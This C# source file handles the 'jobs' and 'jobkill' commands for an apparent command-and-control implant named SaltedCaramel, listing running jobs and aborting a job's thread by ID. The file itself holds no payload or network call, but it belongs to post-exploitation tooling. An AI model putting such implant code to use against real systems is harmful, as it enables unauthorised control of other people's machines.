using Newtonsoft.Json;
using System;
using System.Threading;

namespace SaltedCaramel.Tasks
{
    public class Jobs
    {
        public static void Execute(SCTask task, SCImplant implant)
        {
            if (task.command == "jobs")
            {
                task.status = "complete";
                task.message = JsonConvert.SerializeObject(implant.jobs);
            }
            else if (task.command == "jobkill")
            {
                Thread t;
                foreach (Job j in implant.jobs)
                {
                    if (j.shortId == Convert.ToInt32(task.@params))
                    {
                        t = j.thread;
                        try
                        {
                            t.Abort();
                            task.status = "complete";
                            task.message = $"Killed job {j.shortId}";
                        }
                        catch (Exception e)
                        {
                            task.status = "error";
                            task.message = $"Error stopping job {j.shortId}: {e.Message}";
                        }
                    }
                }
            }
        }
    }
}
